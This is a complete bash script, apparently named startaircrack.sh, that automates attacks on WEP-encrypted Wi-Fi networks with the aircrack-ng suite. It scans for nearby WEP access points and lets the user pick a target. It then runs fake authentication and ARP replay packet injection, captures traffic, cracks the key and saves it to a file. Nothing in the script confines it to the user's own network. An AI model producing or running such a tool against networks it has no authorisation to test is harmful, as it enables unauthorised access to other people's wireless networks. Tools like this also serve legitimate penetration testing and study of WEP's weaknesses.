#!/bin/bash
# This file should be saved as "startaircrack.sh"
#Checks to see if this is being ran as root
if [ x"`which id 2> /dev/null`" != "x" ]; then
USERID="`id -u 2> /dev/null`"
fi
if [ x$USERID = "x" -a x$UID != "x" ]; then
USERID=$UID
fi
if [ x$USERID != "x" -a x$USERID != "x0" ]; then
echo Run it as root ; exit ;
fi
#sets a few var
AIRTIME=300
NUMBER=0
set +v
#Finds the name of your wifi card
if [ x$4 = x ]; then
airmon-ng|grep "-"|cut -b 1,2,3,4,5 > clist
for TEST in `cat clist`; do WCOUNT=$((WCOUNT+1));done
for ESSID in `cat clist`; do WIFI=`echo $ESSID`; done
else
WIFI=$4
WCOUNT=1
fi
if [ x$WIFI = x ]; then
echo "No wifi card detected. Quitting"
exit
fi
#Scans for more than one wifi card
if [ x$WCOUNT != x$((0+1)) ]; then
TEST=`cat clist`
echo $TEST|cut -b 1,2,3,4,5 > null
WIFI=`cat null`
echo "Multiple WiFi cards detected. Using $WIFI"
#If you want to specify your own wifi card; un-comment the line below
#WIFI=ath0
fi
rm clist 2> /dev/null
#Start the wireless interface in monitor mode
if [ x$4 = x ]; then
airmon-ng start $WIFI >tempairmonoutput
WIFI=`cat tempairmonoutput|grep "monitor mode enabled on" |cut -b 30-50 | tr -d [:space:] |tr -d ")"`
if [ x$WIFI = x ];then
WIFI=`cat tempairmonoutput|grep "monitor mode enabled" |cut -b 1-9 | tr -d [:space:]`
fi
fi
#sets the CLIENT_MAC var as the mac of this computer
CLIENT_MAC=` ip link show $WIFI | tail -n 1 | cut -f 6 -d " "`
commandssid02=$1
if [ x"$1" != x"" ];then
commandssid=`echo "$1" | grep : | tr -d [:space:]`
if [ x"$commandssid" = x"" ];then
commandssid="true"
fi
fi
#Checks to see if anything was entered after the command to run this program
if [ x$1 != x -a x"$commandssid" != x"true" ]; then
#I guess something was entered, well then lets assume the following true, and skip the listing of APs
AIRBSSID=$1
AIRCHANNEL=$2
AIRESSID=$3
AIRBSSID2=`echo "$AIRBSSID" | tr -d ":"`
mkdir "$AIRESSID"
else
#lists wifi networks in the area and prompts user to choose one
rm temp-* 2</dev/null
airodump-ng -w temp $WIFI &
SCANPID=$!
sleep 20s
kill $SCANPID
sleep 1s
cat temp-* | strings | grep -B1000 Station | grep ":" | cut -f 1,4,5,6,8,14 -d "," > templist02
grep "WEP" templist02 > templist
#grep "WPA" templist02 >> templist
#grep "OPN" templist02 >> templist
rm config.* 2>/dev/null
NUMBER=0
skipasknumber=""
for EACHMAC in `cat templist | cut -f 1 -d , | tr ":" "-"`
do
NUMBER=$((NUMBER+1))
REALMAC=`echo $EACHMAC | tr "-" ":"`
CHANNEL=`cat templist | grep $REALMAC | cut -f 2 -d , | tr -d [:space:]`
ENCRYPTION=`cat templist | grep $REALMAC | cut -f 4 -d , | tr -d [:space:]`
SSID=`cat templist | grep $REALMAC | cut -f 6 -d ,| cut -f 2-100 -d " "`
echo export AIRESSID="$SSID" > config.$NUMBER
echo export AIRCHANNEL=$CHANNEL >> config.$NUMBER
echo export AIRBSSID=$REALMAC >> config.$NUMBER
echo export AIRBSSID2=`echo "$REALMAC" | tr -d ":"` >> config.$NUMBER
if [ x"$commandssid" = x"true" ];then
if [ x"$SSID" = x"$1" ];then
skipasknumber=$NUMBER
fi
else
echo "#"$NUMBER: $SSID, $ENCRYPTION, $CHANNEL, $REALMAC
#echo SSID: $SSID
#echo "Encryption type:" $ENCRYPTION
#echo "Channel:" $CHANNEL
#echo "Mac Address:" $REALMAC
fi
done
if [ x"$skipasknumber" != x"" ];then
NUMBER=$skipasknumber
else
echo "At the moment only WEP networks are supported"
read -p "Please choose your wifi network by the WIFI Number:" NUMBER
fi
source config.$NUMBER
mkdir "$AIRESSID" >/dev/null 2>/dev/null
iwconfig $WIFI channel $AIRCHANNEL
echo "=================Starting on WiFi network "$AIRESSID"================="
fi
echo "place holder" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
iwconfig $WIFI channel $AIRCHANNEL
sleep 1s
#Opens popup with aireplay-ng to do a fake authentication with the access point
xterm -fn fixed -geom -0-0 -title "Fake Authentication: $AIRESSID" -e "aireplay-ng -1 6000 -o 1 -q 10m -a $AIRBSSID -h $CLIENT_MAC $WIFI|tee tempauth & sleep 120h" 2>/dev/null &
echo "$!" > tempSCANPID
#Opens popup with aireplay-ng in ARP request replay mode to inject packets in new window
xterm -fn fixed -geom +0-0 -title "Arp Replay: $AIRESSID" -e "aireplay-ng -3 -b $AIRBSSID -h $CLIENT_MAC $WIFI|tee temparp" 2>/dev/null &
echo "$!" >> tempSCANPID
#Opens popup with airodump-ng on AP channel with a bssid filter in a new window to collect the new unique IVs
xterm -fn fixed -geom -0+0 -title "Packet Capture: $AIRESSID" -e "airodump-ng -c $AIRCHANNEL --bssid $AIRBSSID -w output $WIFI" 2>/dev/null &
echo "$!" >> tempSCANPID
#waits while airodump gathers data
#clear
echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
read -p "Please wait "$(($AIRTIME/60))" minutes or press ENTER to skip the timer" -t $AIRTIME null
#Starts aircrack
aircrack-ng -z -b $AIRBSSID output*.cap -l "$AIRESSID".key | tee lfkey
for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
grep "KEY FOUND" lfkey >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
if [ x$4 = x ]; then
#Stops the WiFi card and brings it back up for use by the user.
echo "now removing temp interfaces"
#Finds any remaining interfaces and removes them (could take a while if you have more than 10)
iwconfig|grep "Monitor"|cut -b 1,2,3,4,5 > lfcard 2>/dev/null
for tdevice in `cat lfcard`; do airmon-ng stop $tdevice; done 2>/dev/null
fi
tempkeyfound01=`grep "KEY FOUND" lfkey|cut -b 9,10`
if [ x$tempkeyfound01 != x"KE" ]; then
echo "$AIRESSID" > "$AIRESSID"/key_for_"$AIRBSSID2".txt
echo "mac; $AIRBSSID" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
echo "KEY FOUND: Attack was unsuccessful" >> "$AIRESSID"/key_for_"$AIRBSSID2".txt
for temppid in `cat tempSCANPID`; do kill $temppid > tempkillpid; done 2>/dev/null
fi
#Moves all the temp files and the file containing the key in to the folder just made

mv temp* "$AIRESSID" 2>/dev/null
mv *.cap "$AIRESSID" 2>/dev/null
mv config.* "$AIRESSID" 2>/dev/null
mv lfkey "$AIRESSID" 2>/dev/null
mv lfcard "$AIRESSID" 2>/dev/null
mv output-* "$AIRESSID" 2>/dev/null
cp maclist "$AIRESSID" 2>/dev/null
chmod 777 "$AIRESSID"/* 2>/dev/null
chmod 777 "$AIRESSID" 2>/dev/null
#a frendly message
echo "If your key was found it will be in a folder with the same name as your WiFi AP"
echo "It will be in a text file named with the name of the target AP"
echo "======================This program is now complete======================="
exit;
